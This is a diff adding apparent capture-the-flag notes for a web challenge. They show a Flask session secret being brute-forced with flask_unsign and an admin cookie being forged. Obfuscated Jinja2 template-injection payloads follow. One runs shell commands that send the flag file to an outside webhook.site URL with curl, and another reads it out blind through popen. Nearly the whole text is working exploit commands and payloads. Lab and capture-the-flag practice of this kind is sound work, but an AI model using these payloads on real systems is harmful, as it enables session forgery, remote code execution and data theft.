@@ -1,0 +1,19 @@
+Can brute-force the secret key...
+
+.eJwlzjkOwjAQQNG7uKbw2LPYuUzk2QRtQirE3YnEr3_xPmXPI85n2d7HFY-yv7xsRbEth1QkYAP3jkShY3QKGwMNYVIK1T4U7tRaV2_GGElOxkOMtfZ7Mls8w0cqp2ElJRCcyItNWxNtMC0SpovNLlmryOpSbsh1xvHXrPL9AckML3Q.ZhsJaw.qbzX_Wgug8Lgb-BpuZd8mFSn8Jw
+$ python -m flask_unsign --unsign --wordlist wordlist.txt --no-literal-eval --cookie ".eJwlzjkOwjAQQNG7uKbw2LPYuUzk2QRtQirE3YnEr3_xPmXPI85n2d7HFY-yv7xsRbEth1QkYAP3jkShY3QKGwMNYVIK1T4U7tRaV2_GGElOxkOMtfZ7Mls8w0cqp2ElJRCcyItNWxNtMC0SpovNLlmryOpSbsh1xvHXrPL9AckML3Q.ZhsJaw.qbzX_Wgug8Lgb-BpuZd8mFSn8Jw"
+[*] Session decodes to: {'_fresh': True, '_id': 'b42ad1fb4516c1dd3455eb8835ec884c4195f75038b1111bc23bd2c64ef5d5c687c6b0395fcca69ed8fb6fc405b5174946a6cb227b219cef19d7c937f0077a37', '_user_id': 'a'}
+[*] Starting brute-forcer with 8 threads..
+[+] Found secret key after 769664 attempts
+b'0xbbe18'
+
+$ python -m flask_unsign --sign --no-literal-eval --cookie "{'_fresh': True, '_id': 'b42ad1fb4516c1dd3455eb8835ec884c4195f75038b1111bc23bd2c64ef5d5c687c6b0395fcca69ed8fb6fc405b5174946a6cb227b219cef19d7c937f0077a37', '_user_id': 'admin'}" --secret "0xbbe18"
+.eJwlzjkOwjAQQNG7uKbw2LPYXAZ5NpECigQqxN2JxK9_8T7llnsc93J97e-4lNvm5VoU23JIRQI2cO9IFDpGp7Ax0BAmpVDtQ-FMrXX1ZoyR5GQ8xFhrPyezxTN8pHIaVlICwYm82LQ10QbTImG62OyStYqsLuWEvI_Y_5rlj-1Zvj-L1jEc.ZhsPQQ.n32vYXXNNvIZm0YB2TThlPOhQFo
+
+$ http://pwnhub.hammer.b01le.rs/createpost
+{%set a=cycler|attr("%c%cinit%c%c"%((95,)*4))|attr("%c%cglobals%c%c"%((95,)*4))|items|selectattr("0","equalto","os")|first|last|attr("system")("cat /flag* | curl -X POST -F data=@- https://webhook%csite/874185a4-29cd-4c56-bb2c-6e9550716f30"%(46,))%}
+
+{%for a in cycler|attr("%c%cinit%c%c"%((95,)*4))|attr("%c%cglobals%c%c"%((95,)*4))|items|selectattr("0","equalto","os")|first|last|attr("popen")("cat /flag*")|attr("read")()|attr("strip")()%}{%if a=="b"%}1{%else%}0{%endif%}{%endfor%}
+http://pwnhub.hammer.b01le.rs/view/2375d5dcded4684af75113b193db8361b0520fd6305ae84f08ca54bd214c5987
+
+Use the above bitmap generator and automate the attack.
